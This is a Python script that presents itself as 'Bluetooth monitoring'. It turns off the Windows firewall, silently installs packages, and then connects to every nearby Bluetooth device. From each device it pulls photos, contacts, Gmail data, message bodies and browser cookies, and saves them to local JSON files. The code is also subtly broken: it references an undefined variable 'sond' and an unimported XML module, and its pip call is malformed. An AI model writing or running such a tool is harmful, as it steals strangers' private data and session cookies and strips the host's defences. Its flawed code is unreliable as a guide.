import bluetooth
import json
import os
import platform
import sqlite3
import subprocess
import sys
import threading
import time
import signal

def keyboard_interrupt_handler(signal, frame):
    print("Keyboard interrupt detected. Exiting program...")
    sys.exit(0)

# Register the keyboard interrupt handler
signal.signal(signal.SIGINT, keyboard_interrupt_handler)

def install_packages(pkgs):
    for pkg in pkgs:
        install_package(pkg)

def install_package(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "pip2", "install", pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_bluetooth_monitoring():
    # Determine the operating system
    system = platform.system()
    
    if system == "Windows":
        print("Disabling firewall...")
        subprocess.call(["netsh", "advfirewall", "set", "currentprofile", "state", "off"])
        subprocess.call(["netsh", "advfirewall", "set", "currentprofile", "firewallpolicy", "allowinbound,allowoutbound"])
        subprocess.call(["netsh", "advfirewall", "set", "currentprofile", "settings", "localfirewallrules", "enable"])
        subprocess.call(["netsh", "advfirewall", "set", "currentprofile", "state", "off"])

        print("Starting Bluetooth monitoring...")
        subprocess.Popen(["powershell", "-NoProfile", "-Command", "Start-Process", "-FilePath", "BluetoothControl.exe", "-ArgumentList", "-Monitorservice"], creationflags=subprocess.CREATE_NEW_CONSOLE)

        # Install missing packages
        install_packages(["pywin32"])
    
    elif system == "Linux":
        dist = platform.dist()[0]
        if dist == "Ubuntu":
            print("Updating apt sources...")
            subprocess.call(["apt-get", "update"])

            print("Installing required packages...")
            subprocess.call(["apt-get", "install", "-y", "libbluetooth-dev", "bluetooth"], stderr=subprocess.DEVNULL)

            # Install missing packages
            install_packages(["pybluez", "python-bluez"])
        
        elif dist == "CentOS":
            print("Installing required packages...")
            subprocess.call(["yum", "install", "-y", "bluez-libs-devel", "bluez"], stderr=subprocess.DEVNULL)

            # Install missing packages
            install_packages(["pybluez", "python-bluez"])
        
        elif dist == "Kali":
            # Install missing packages
            install_packages(["pybluez"])
        
    elif system == "Darwin":
        print("Installing required packages...")
        subprocess.call(["brew", "install", "bluez"], stderr=subprocess.DEVNULL)

        # Install missing packages
        install_packages(["pybluez"])

    else:
        print(f"Error: Unsupported system '{system}'.")
        return

    print("Bluetooth monitoring started.")

def multithreading(devices, func):
    threads = []
    for device in devices:
        thread = threading.Thread(target=func, args=(device,))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

def get_devices():
    devices = bluetooth.discover_devices(duration=10, lookup_names=True)
    return [{"addr": addr, "name": name} for addr, name in devices]

def extract_data(device):
    addr = device["addr"]
    name = device["name"]
    sock = None
    try:
        print(f"Connecting to {name} ({addr})...")
        sock = connect_to_device(addr)
        print(f"Extracting data from {name} ({addr})...")
        photos = extract_photos(sock)
        contacts = extract_contacts(sock)
        emails = extract_emails(sock)
        cookies = extract_cookies(sock)
        notes = extract_notes(sock)
        save_data(name, photos, contacts, emails, cookies, notes)
        print(f"Data from {name} ({addr}) extracted and saved")
    except Exception as e:
        print(f"Failed to extract data from {name} ({addr}): {str(e)}")
    finally:
        if sock is not None:
            sock.close()

def connect_to_device(addr):
    port = 1
    sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
    sock.connect((addr, port))
    return sock

def extract_photos(sock):
    photos = []
    sock.send(b"ls /storage/emulated/0/DCIM/Camera/\n")
    data = sock.recv(4096)
    files = data.decode().split('\n')
    for file in files:
        if file.endswith(".jpeg") or file.endswith(".png") or file.endswith(".heic"):
            sock.send(("cat /storage/emulated/0/DCIM/Camera/" + file + "\n").encode())
            data = sock.recv(4096)
            while b'\n' not in data:
                data += sock.recv(4096)
            filename = file.split("/")[-1]
            with open(filename, "wb") as f:
                f.write(data.rstrip(b'\n'))
            photos.append(filename)
    return photos

def extract_contacts(sock):
    contacts = []
    sock.send(b"cat /data/data/com.android.providers.contacts/databases/contacts2.db\n")
    data = sock.recv(4096)
    while b"SQLite format 3" not in data:
        data = sock.recv(4096)
    while b"BEGIN TRANSACTION;" not in data:
        data = sock.recv(4096)
    while b"COMMIT;" not in data:
        data += sock.recv(4096)
    conn = sqlite3.connect(":memory:")
    conn.executescript(data.decode())
    c = conn.cursor()
    c.execute("SELECT display_name, data1 FROM view_data WHERE mimetype_id=5")
    rows = c.fetchall()
    for row in rows:
        name = row[0]
        number = row[1]
        contacts.append({"name": name, "number": number})
    return contacts

def extract_emails(sock):
    emails = []
    sond.send(b"cat /data/data/com.google.android.gm/shared_prefs/UnifiedEmail_prefs.xml\n")
    data = sock.recv(4096)
    while b"</map>" not in data:
        data += sock.recv(4096)
    data = data[ data.rfind(b"<?xml"):data.rfind(b"</map>") + len(b"</map>") ]
    root = ET.fromstring(data.decode())
    for child in root:
        if child.get("name") == "EMAIL_LIST":
            for email in child:
                emails.append({"email": email.get("value")})
            break
    return emails

def extract_cookies(sock):
    cookies = []
    sond.send(b"cat /data/data/com.android.browser/databases/webview.db\n")
    data = sock.recv(4096)
    while b"SQLite format 3" not in data:
        data = sock.recv(4096)
    while b"BEGIN TRANSACTION;" not in data:
        data = sock.recv(4096)
    while b"COMMIT;" not in data:
        data += sock.recv(4096)
    conn = sqlite3.connect(":memory:")
    conn.executescript(data.decode())
    c = conn.cursor()
    c.execute("SELECT host, name, value FROM cookies")
    rows = c.fetchall()
    for row in rows:
        domain = row[0]
        name = row[1]
        value = row[2]
        cookies.append({"domain": domain, "name": name, "value": value})
    return cookies

def extract_notes(sock):
    notes = []
    sond.send(b"cat /data/data/com.google.android.gm/databases/EmailProviderBody.db\n")
    data = sock.recv(4096)
    while b"SQLite format 3" not in data:
        data = sock.recv(4096)
    while b"BEGIN TRANSACTION;" not in data:
        data = sock.recv(4096)
    while b"COMMIT;" not in data:
        data += sock.recv(4096)
    conn = sqlite3.connect(":memory:")
    conn.executescript(data.decode())
    c = conn.cursor()
    c.execute("SELECT subject, body FROM Message")
    rows = c.fetchall()
    for row in rows:
        subject = row[0]
        body = row[1]
        notes.append({"subject": subject, "body": body})
    return notes

def save_data(name, photos, contacts, emails, cookies, notes):
    data = {"name": name, "photos": photos, "contacts": contacts, "emails": emails, "cookies": cookies, "notes": notes}
    with open(name + ".json", "w") as f:
        json.dump(data, f)

def main():
    start_bluetooth_monitoring()
    devices = get_devices()
    multithreading(devices, extract_data)

if __name__ == "__main__":
    main()
